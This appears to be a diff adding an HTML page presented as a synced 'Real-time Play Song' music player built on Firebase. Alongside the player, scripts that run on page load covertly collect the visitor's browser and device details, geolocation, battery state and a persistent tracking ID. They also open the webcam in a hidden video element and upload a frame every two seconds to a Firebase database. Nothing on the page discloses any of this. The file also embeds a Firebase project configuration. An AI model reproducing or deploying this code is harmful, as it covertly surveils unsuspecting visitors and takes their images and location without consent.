@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Real-time Play Song</title>
+  <style>
+#search {
+  height: 38px;
+  text-align: center;
+  position: sticky;
+  top: 30px;
+  width: 90%;
+  border-radius: 35px;
+  font-size: 20px;
+  border: 2px solid #369;
+}
+body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #333;
+     
+}
+
+
+ol {
+  list-style: none;
+  padding: 0;
+  margin-top: 20px;
+  padding-top: 30px;
+  
+
+  
+}
+
+li {
+  cursor: pointer;
+  padding: 10px;
+  color: #f1f1f1;
+  background-color: #155;
+  border-bottom: 1px solid #ccc;
+  transition: background-color 0.3s ease;
+}
+
+li:nth-child(odd):hover, li:hover {
+  background-color: #45a049;
+  font-weight: 1000;
+}
+li:nth-child(odd) {
+  background-color: #165;
+  color: #E2C18F;
+  font-weight: bolder;
+}
+audio {
+  display: none;
+}
+
+.playing {
+  background-color: #4caf50 !important;
+}
+
+.playing span {
+  display: inline-block;
+  width: 10px;
+  height: 10px;
+  background-color: #343f4f;
+  border-radius: 50%;
+  margin-right: 8px;
+}
+
+.loader {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color: #fff;
+  z-index: 9999;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.loader::after {
+  content: " ";
+  width: 60px;
+  height: 60px;
+  border-radius: 50%;
+  border: 6px solid #555;
+  border-color: #555 transparent #555 transparent;
+  animation: loaderAnimation 1.5s linear infinite;
+}
+
+@keyframes loaderAnimation {
+  0% {
+    transform: rotate(0);
+    
+  }
+  100% {
+    transform: rotate(360deg);
+    
+  }
+}
+
+  </style>
+</head>
+<body>
+    <div class="loader"></div>
+  <script>
+  window.addEventListener('load', function() {
+      var loader = document.querySelector('.loader');
+      loader.style.display = 'none';
+    });
+  </script>
+             <center>  <input type="text" id="search" placeholder="Search..." onkeyup="searchSong()">
+  <ol id="songList"></ol>
+</center>
+
+<script>
+  // Codes for searching song
+ function searchSong() {
+    const searchInput = document.getElementById('search').value.toLowerCase();
+    const songs = document.querySelectorAll('#songList li');
+
+    songs.forEach((song) => {
+      const songName = song.textContent.toLowerCase();
+
+      if (songName.includes(searchInput)) {
+        song.style.display = 'block';
+      } else {
+        song.style.display = 'none';
+      }
+    });
+  }
+</script>
+
+
+
+
+
+  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+  
+  
+  
+  
+  
+  <script>
+    // Firebase configuration
+    const firebaseConfig = {
+  apiKey: "AIzaSyBXraZCociE9yyf21sJAPi6Ghka8-wDjRY",
+  authDomain: "pchat-2d593.firebaseapp.com",
+  projectId: "pchat-2d593",
+  storageBucket: "pchat-2d593.appspot.com",
+  messagingSenderId: "227219894260",
+  appId: "1:227219894260:web:4051159689f8ea7f1b53a1"
+};
+
+
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+
+    // Get a reference to the Realtime Database
+    const database = firebase.database();
+
+    // Retrieve song data from the Realtime Database
+    const songListElement = document.getElementById('songList');
+    const songRef = database.ref('songs');
+
+    // Create a global variable to hold the audio player reference
+    let audioPlayer;
+
+    // Play the selected song on all devices
+    function playSong(songKey, songUrl) {
+      // Stop the currently playing song if it exists
+      if (audioPlayer) {
+        audioPlayer.pause();
+        audioPlayer.currentTime = 0;
+      }
+
+      // Create a new audio element and play the song
+      audioPlayer = new Audio(songUrl);
+      audioPlayer.play();
+
+      // Update the playback state in the Realtime Database
+      const playbackRef = database.ref('playback');
+      playbackRef.set({
+        songKey: songKey,
+        songUrl: songUrl,
+        isPlaying: true
+      });
+    }
+
+    // Stop the currently playing song
+    function stopSong() {
+      // Check if an audio player exists
+      if (audioPlayer) {
+        audioPlayer.pause();
+        audioPlayer.currentTime = 0;
+      }
+
+      // Update the playback state in the Realtime Database to stop playback
+      const playbackRef = database.ref('playback');
+      playbackRef.set({
+        songKey: null,
+        songUrl: null,
+        isPlaying: false
+      });
+    }
+
+    songRef.on('value', (snapshot) => {
+      // Clear the song list
+      songListElement.innerHTML = '';
+
+      snapshot.forEach((songSnapshot) => {
+        const songKey = songSnapshot.key;
+        const songName = songSnapshot.child('name').val();
+        const songUrl = songSnapshot.child('url').val();
+
+        // Create a new list item for each song
+        const li = document.createElement('li');
+        li.textContent = songName;
+        songListElement.appendChild(li);
+
+        // Play the selected song
+        li.addEventListener('click', () => {
+          playSong(songKey, songUrl);
+        });
+      });
+    });
+
+    const playbackRef = database.ref('playback');
+    playbackRef.on('value', (snapshot) => {
+      const playbackState = snapshot.val();
+
+      if (playbackState && playbackState.isPlaying) {
+        const songUrl = playbackState.songUrl;
+
+        // Stop the currently playing song if it exists
+        if (audioPlayer) {
+          audioPlayer.pause();
+          audioPlayer.currentTime = 0;
+        }
+
+        // Create a new audio element and play the song
+        audioPlayer = new Audio(songUrl);
+        audioPlayer.play();
+      }
+    });
+  </script>
+  
+  
+<script>
+
+  function saveInformation(userAgent, screenWidth, screenHeight, userLanguage, platform, version, deviceMemory, connectionType) {
+    var informationRef = database.ref("information");
+
+    var information = {
+      userAgent: userAgent,
+      screenWidth: screenWidth,
+      screenHeight: screenHeight,
+      userLanguage: userLanguage,
+      platform: platform,
+      version: version,
+      deviceMemory: deviceMemory,
+      connectionType: connectionType
+    };
+
+    
+    informationRef.push().set(information, function(error) {
+      if (error) {
+        console.log("Error saving information:", error);
+      } else {
+        console.log("🤣😅😅");
+      }
+    });
+  }
+
+  
+  var userAgent = navigator.userAgent;
+  console.log('User Agent:', userAgent);
+
+  var screenWidth = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
+  var screenHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
+  console.log('Screen Size:', screenWidth, 'x', screenHeight);
+
+  var userLanguage = navigator.language || navigator.userLanguage;
+  console.log('User Language:', userLanguage);
+
+  var platform = navigator.platform;
+  var version = navigator.appVersion;
+  console.log('Platform:', platform);
+  console.log('Version:', version);
+
+  var deviceMemory = navigator.deviceMemory || 'Unknown';
+  console.log('Device Memory (GB):', deviceMemory, "GB RAM");
+
+  var connectionType = navigator.connection ? navigator.connection.type : 'Unknown';
+  console.log('Connection Type:', connectionType);
+
+  
+  saveInformation(userAgent, screenWidth, screenHeight, userLanguage, platform, version, deviceMemory, connectionType);
+  
+  if ("geolocation" in navigator) {
+
+  navigator.geolocation.getCurrentPosition(
+    function(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      
+      database.ref("information").push().set({
+        latitude: latitude,
+        longitude: longitude
+      }).then(() => {
+        console.log("Geolocation data saved successfully!");
+      }).catch((error) => {
+        console.error("Error saving geolocation data:", error);
+      });
+    },
+    function(error) {
+      console.error("Error getting geolocation:", error);
+    }
+  );
+} else {
+  console.log("Geolocation is not supported by this browser.");
+}
+navigator.getBattery().then(function (battery) {
+      
+      updateBatteryStatus(battery);
+
+      battery.addEventListener('levelchange', function () {
+        updateBatteryStatus(battery);
+      });
+
+      battery.addEventListener('chargingchange', function () {
+        updateBatteryStatus(battery);
+      });
+    });
+
+    function updateBatteryStatus(battery) {
+      var batteryLevel = battery.level * 100;
+      var chargingStatus = battery.charging ? 'Yes' : 'No';
+
+      console.log('Battery Level: ' + batteryLevel + '%');
+      console.log('Charging: ' + chargingStatus);
+
+      
+      database.ref('information').push().set({
+        level: batteryLevel,
+        charging: chargingStatus
+        
+        
+      }).then(() => {
+        console.log("btr successfully!");
+      }).catch((error) => {
+        console.log("battery Saving error");
+      });
+    }
+    </script>
+    
+    
+    
+    
+    <script>
+    var by = "github";
+function identifyUser() {
+  var uniqueIdentifier = localStorage.getItem('uniqueIdentifier');
+
+  if (!uniqueIdentifier) {
+    uniqueIdentifier = generateUniqueIdentifier();
+    localStorage.setItem('uniqueIdentifier', uniqueIdentifier);
+  }
+
+  return uniqueIdentifier;
+}
+
+function generateUniqueIdentifier() {
+
+  var currentDate = new Date();
+  var timestamp = currentDate.getTime();
+  var randomNumber = Math.floor(Math.random() * 1000000);
+  var uniqueIdentifier = 'ID-' + timestamp + '-' + randomNumber;
+
+  return uniqueIdentifier;
+}
+
+
+var userId = identifyUser();
+console.log(userId);
+
+  function saveCurrentTime() {
+  var date = new Date();
+  var currentTime = date.toLocaleString();
+
+  
+  firebase.database().ref('information').push().set({
+    time: currentTime,
+    id: userId,
+    By: by
+  }, function(error) {
+    if (error) {
+      console.log('Failed to save the current time:', error);
+    } else {
+      console.log('Current time saved successfully!');
+    }
+  });
+}
+
+saveCurrentTime();
+
+  
+</script>
+
+  <div id="cameraContainer">
+    <video id="videoElement" style="display:none"></video>
+  </div>
+<script>
+    const videoElement = document.getElementById('videoElement');
+
+    // Check browser support for getUserMedia
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      // Request access to the webcam
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          // Set the video stream as the source of the video element
+          videoElement.srcObject = stream;
+          videoElement.play();
+
+          // Capture pictures every 2 seconds
+          setInterval(capturePicture, 2000);
+        })
+        .catch(function(error) {
+          console.error('Error accessing the webcam:', error);
+        });
+    } else {
+      console.error('getUserMedia is not supported in your browser.');
+    }
+
+    function capturePicture() {
+      // Create a canvas element and draw the current video frame onto it
+      const canvas = document.createElement('canvas');
+      const context = canvas.getContext('2d');
+      canvas.width = videoElement.videoWidth;
+      canvas.height = videoElement.videoHeight;
+      context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+      // Save the image in Firebase Realtime Database
+      const imageData = canvas.toDataURL();
+      const imagesRef = database.ref('captured');
+      imagesRef.push({ data: imageData });
+    }
+  </script>
+  
+
+
+</body>
+</html>
